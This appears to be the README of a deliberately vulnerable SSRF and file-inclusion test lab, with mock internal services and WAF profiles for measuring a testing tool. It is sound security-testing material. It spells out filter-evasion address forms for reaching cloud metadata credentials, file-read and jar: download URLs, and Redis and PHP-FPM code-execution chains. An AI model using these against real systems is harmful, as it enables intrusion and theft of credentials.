# InjectorKit lab

A deliberately vulnerable host to test against, and the internal services an
SSRF is supposed to reach. Everything here is intentionally unsafe: run it on a
box that is only reachable from the testing machine.

## Deploy

    scp -r lab/* root@<box>:/opt/injectorkit-lab/
    ssh root@<box> "cd /opt/injectorkit-lab && bash setup.sh"

`teardown.sh` stops everything and undoes what setup changed; `teardown.sh
--purge` removes the files as well.

## What it exposes

Web application on port 8080 (Apache, mod_php):

    /fetch.php?url=<url>      server-side fetch (SSRF). http, https, file, php,
                              data and ftp go through the stream layer; gopher
                              and dict are spoken over a raw socket, which is
                              what lets a payload drive an internal service.
    /fetch_redirect.php?url=  the same, but following redirects - the shape that
                              matters against a whitelisting filter
    /fetch_split.php?host=&path=
                              the destination is assembled from two parameters,
                              and the host may not carry a path of its own, so a
                              single-parameter payload cannot fill it in
    /include.php?file=<path>  local file inclusion, including php://filter,
                              data:// and phar://
    /redirect.php?to=<url>    open redirect

The Java lab, on :9100, is the other half of the pseudo-protocol work. Its
`/fetch?url=` hands the value straight to `new URL(...).openStream()` - there is
no include and no file read in the application's own code, only a URL it was
given - so what the JVM will open for it is the entire attack surface:

    /fetch?url=jrt:/java.base/java/lang/String.class   a class inside the JDK (Java 9+)
    /fetch?url=file:///etc/passwd                      a plain read, to compare against
    /fetch?url=jar:http://<you>/x.jar!/                the JVM downloads the archive first

That last one is why `jar:` matters: the fetch happens before anything is parsed,
so the archive's location is chosen by whoever wrote the URL, and an attacker's
host is on the other end of it. The lab returns responses byte for byte, because
a class file decoded as text loses the magic number that identifies it.

What the engine reaches, measured against this lab:

    cloud metadata                 direct, and over gopher when a header is
                                   required (GCP and Azure)
    file read                      file://, php://filter (base64 decoded before
                                   matching)
    internal services              redis, memcached, docker, etcd, kubelet,
                                   elasticsearch, consul, php-fpm
    blind fetch                    callback through a local listener or an
                                   interactsh deployment
    whitelisted target             `--via` a redirect on the trusted host
    address-filtered target        decimal, octal, short form, IPv4-mapped,
                                   trailing dot, nip.io
    split destination              two parameters filled in one request
    exploitation                   redis write-a-file (verified by executing),
                                   php-fpm (see below)

Internal services, reachable only from the box itself:

    127.0.0.1:6379    redis (real, with protected configs enabled so the
                      write-a-file chain can run at all)
    169.254.169.254:80 cloud instance metadata, including IAM credentials.
                      GCP and Azure refuse a request without their magic
                      header, which is what makes the gopher path meaningful
    127.0.0.1:2375    Docker API
    127.0.0.1:2379    etcd
    127.0.0.1:10255   kubelet (read-only)
    127.0.0.1:9200    Elasticsearch
    127.0.0.1:8500    Consul
    127.0.0.1:8899    an "internal admin panel"
    127.0.0.1:11211   memcached (stand-in)
    127.0.0.1:9000    php-fpm (real; `php8.4-fpm` with its pool moved to TCP)

The Docker, etcd, Consul, kubelet, Elasticsearch, memcached and PHP-FPM answers
are stand-ins: they exist so a fingerprint has the right shape to recognise, not
to be faithful implementations. Redis is the real thing.

## Testing against a filter

    python3 waf.py 8081 --profile a    # knows dotted addresses and schemes
    python3 waf.py 8082 --profile b    # also knows decimal, hex and octal

Two signature WAFs in front of the application: each refuses requests whose
query carries a known literal, with 403 and a refusal phrase. They are
deliberately naive the way real signature filters are naive - they match
literals in the request as it arrives, and they lower-case before matching.

The two profiles differ in one thing: which address spellings they recognise.
Profile A knows the dotted form, so decimal addresses walk past it. Profile B
knows decimal, hexadecimal and octal too, so the short form (`169.254.43518`) is
what gets through. That difference is the point: a prior learned against A says
"decimal addresses work", which is worth nothing against B, and the pair is
there to show whether carrying experience forward helps or hurts.

Measured (address bypass only, same application behind each):

    B cold, no priors                       56 requests, 6 findings
    A run                                   53 requests, 6 findings
    B with A's priors, first run            49 requests, 6 findings
    B with A's priors, second run           45 requests, 6 findings

### Stricter filters

    python3 waf.py 8083 --profile c    # semantic: parses the destination
    python3 waf.py 8084 --profile d    # whitelist: only the application's own host
    python3 waf.py 8085 --profile e    # reads the first value of each parameter

Profile C stops looking for bad strings and parses the destination out of the
request, decoding to a stable form first and stripping the trailing dot an
absolute name may carry. Dotted, short, integer, octal, hexadecimal and
IPv4-mapped spellings all collapse to the same judgement.

Profile D is the other idea: it does not describe bad input, it requires good
input, and the only host the application may fetch is itself. Nothing on any
blocklist matters; the way through is a redirect the target follows on its own
behalf - which is what `fetch_redirect.php` exists for.

What the engine did against each, same application throughout:

    A  blocklist, literal          bypassed: 6 findings (decimal and short addresses)
    B  blocklist, address-aware    bypassed: 6 findings (the short form)
    C  semantic, normalised        bypassed: 6 findings (a name that resolves back inside)
    D  whitelist                   closed: 0 findings, and it says so
    E  first value only            bypassed: 12 findings in 14 requests

Profile C is what a rule set looks like when it parses the destination instead of
searching the text: every address spelling collapses to the same judgement, and it
holds against all of them. What it cannot see is a name - `169.254.169.254.nip.io`
resolves back to the same address, and knowing that would mean doing the lookup
itself. The filter is thorough and still does not cover the question, which is a
property of judging strings rather than a flaw in this profile.

Profile E judges one value per parameter name and stops, which is a shape worth
having in the lab because a lot of filters are written that way: they take
`query["url"]`, while the application's own parser takes the last occurrence. The
two never look at the same string, and nothing has to be rewritten to exploit it
- sending the parameter twice, the original value first and the payload last, is
enough. The engine tries that before any mutation, and profile A is the control
that shows why: A reads every occurrence, so the same attempt changes nothing
there.

Getting C to that state took four rounds, and each round was a real evasion the
engine found before the rule set knew about it: `0251.0376.0251.0376` (octal
with padding), `169.254.43518` (the three-part short form), a double-encoded
address (against a filter that decoded once before judging), and
`169.254.169.254.` (a trailing dot, which a resolver ignores). That is the
mutation catalogue doing what it is for.

The gap D exposes is not a bug in the engine, it is a missing capability: a
whitelisting filter cannot be walked past by spelling anything differently, only
by routing through a host the filter already trusts. There is no seed for that
yet.

### Other observations


- `gopher://` is closed by both profiles. The filter is case-insensitive, so
  scheme-casing is not an evasion, and the target decodes the query once, so a
  double-encoded payload reaches PHP as a literal percent sequence rather than a
  URL. That route is closed on this target, which is the answer - not a bypass
  that only looks like one.

### The PHP-FPM chain

Verified end to end: the fingerprint is a real FastCGI request for a script that
does not exist, and the follow-up runs code through `PHP_VALUE
auto_prepend_file`, with the script's output arriving inside the FastCGI reply.

Getting there took a while, and the mistake is worth recording because the wrong
version looks more natural than the right one. A FastCGI name-value pair is
encoded as `nameLength, valueLength, name, value` - both lengths first. Writing
it as `nameLength, name, valueLength, value` produces a stream that is
structurally perfect and never works: the listener reads the first length, takes
the second length as the start of the name, and drops the connection without a
word. Everything else - padding, variable set, ordering, how the write is split
across packets - was eliminated first, and none of it was the cause.

### A third-party WAF in front of it

The four `waf.py` profiles are this lab's own filters, written to be understood.
The baseline that matters is someone else's rule set:

    bash waf-donothack.sh          # 8090 -> 8080, the PHP side
    bash waf-donothack.sh 9100     # 8090 -> 9100, the Java side
    bash waf-donothack.sh stop

donothack is a separate download; unpack it and point `DNH` at the directory.
Its rule set is the acceptance baseline for this project - a payload that gets
through it is worth having, and one that does not is a finding to report, not a
bug to hide.

What it covers, measured:

    php://filter, php://input   blocked, literal match after urlDecode x2 + lowercase
    phar://, zip://, expect://, glob://, compress.*
                                blocked, same rule
    data://text/plain           blocked; `data:text/plain` (no slashes) is not
    file:///etc, file:///proc   blocked; other targets under file:// are not
    path traversal, sensitive paths
                                blocked, with normalisation folded in
    parameter pollution          handled - two values for one name are both read
    null bytes, CRLF, long URIs blocked as protocol violations
    jar:, jrt:, netdoc://       not in the rule set at all

That last line is the useful part. Against the PHP side the tool gets refused
almost everywhere and says so; against the Java side it still lands a read
through `jrt:` after seventy-odd refusals, because a rule set that knows one
runtime's wrappers does not know the other's.

Requests, for scale: 43 to reach four wrappers on an unprotected lab, 93 to keep
one through the WAF.

### The Redis chain

Verified: the file lands, the follow-up request runs it, and the output comes
back.

Two things had to be undone before it worked, and both are worth knowing:

- `rdbcompression no` has to come first. With compression on, the payload is
  stored compressed, `<?php` never appears as bytes in the file, and PHP parses
  none of it - the write still succeeds, which is why execution is what gets
  verified.
- the base64 blob an `eval` is handed must be *bare* code, not a `<?php ... ?>`
  document. Tags inside `eval` are a parse error, and it fails silently.

## Notes


setup.sh stops Apache's default site and comments out `Listen 80` in
`/etc/apache2/ports.conf`, because the metadata stand-in needs 169.254.169.254:80
and Apache's default site would bind 0.0.0.0:80 and take it. teardown.sh puts
both back.

The metadata address is added to `lo` and removed again by teardown. Nothing
here survives a reboot; re-run setup.sh after one.
